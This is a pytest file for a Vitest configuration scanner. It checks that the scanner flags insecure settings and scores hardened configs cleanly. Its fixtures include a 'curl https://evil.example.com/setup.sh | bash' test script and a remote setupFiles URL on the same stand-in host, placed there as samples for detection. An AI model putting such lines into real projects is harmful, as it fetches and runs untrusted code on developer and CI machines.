"""Tests for VitestAnalyzer."""

import json
from pathlib import Path

from devai.vitest_analyzer import VitestAnalyzer, VitestFinding


INSECURE_VITEST_CONFIG = """\
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    dangerouslyIgnoreUnhandledErrors: true,
    isolate: false,
    allowOnly: true,
    testTimeout: 0,
    passWithNoTests: true,
    setupFiles: ['https://evil.example.com/setup.js'],
    environment: 'node',
    browser: { enabled: true },
    coverage: { enabled: false },
    server: { deps: { inline: ['*'] } },
  },
});
"""

INSECURE_PACKAGE_JSON = {
    "name": "demo",
    "scripts": {
        "test": "vitest run --no-isolate --allowOnly",
        "test:ci": "curl https://evil.example.com/setup.sh | bash && vitest",
    },
    "devDependencies": {
        "vitest": "^2.0.0",
    },
}

HARDENED_VITEST_CONFIG = """\
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    isolate: true,
    testTimeout: 10000,
    passWithNoTests: false,
    allowOnly: false,
    dangerouslyIgnoreUnhandledErrors: false,
    setupFiles: ['./test/setup.ts'],
    coverage: {
      enabled: true,
      thresholds: { lines: 80, functions: 80, branches: 70, statements: 80 },
    },
  },
});
"""


class TestVitestAnalyzer:
    def test_detects_insecure_vitest_config(self, tmp_path: Path):
        (tmp_path / "vitest.config.ts").write_text(INSECURE_VITEST_CONFIG, encoding="utf-8")
        analyzer = VitestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "ignore_unhandled_errors" in kinds
        assert "isolation_disabled" in kinds
        assert "allow_only_enabled" in kinds
        assert "zero_timeout" in kinds
        assert "remote_setup_file" in kinds or "insecure_http" in kinds

    def test_detects_insecure_package_json(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(
            json.dumps(INSECURE_PACKAGE_JSON, indent=2),
            encoding="utf-8",
        )
        analyzer = VitestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "unsafe_cli_flags" in kinds
        assert "curl_pipe_shell" in kinds or "dangerous_test_script" in kinds

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "vitest.config.ts").write_text(HARDENED_VITEST_CONFIG, encoding="utf-8")
        analyzer = VitestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert len(high) == 0

    def test_health_score(self, tmp_path: Path):
        (tmp_path / "vitest.config.ts").write_text(INSECURE_VITEST_CONFIG, encoding="utf-8")
        analyzer = VitestAnalyzer(str(tmp_path))
        score = analyzer.health_score()
        assert score < 100.0

    def test_hardened_template(self):
        analyzer = VitestAnalyzer(".")
        template = analyzer.generate_hardened_config()
        assert "dangerouslyIgnoreUnhandledErrors: false" in template
        assert "isolate: true" in template

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "vitest.config.ts").write_text(HARDENED_VITEST_CONFIG, encoding="utf-8")
        analyzer = VitestAnalyzer(str(tmp_path))
        assert "Vitest configs:" in analyzer.summary()
        assert "Vitest analysis:" in analyzer.to_context()

    def test_finding_format(self):
        finding = VitestFinding(
            kind="ignore_unhandled_errors",
            severity="high",
            message="test message",
            path="vitest.config.ts",
            lineno=5,
        )
        assert "[high]" in finding.format()
        assert "vitest.config.ts:5" in finding.format()

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = VitestAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Vitest configs: none found"
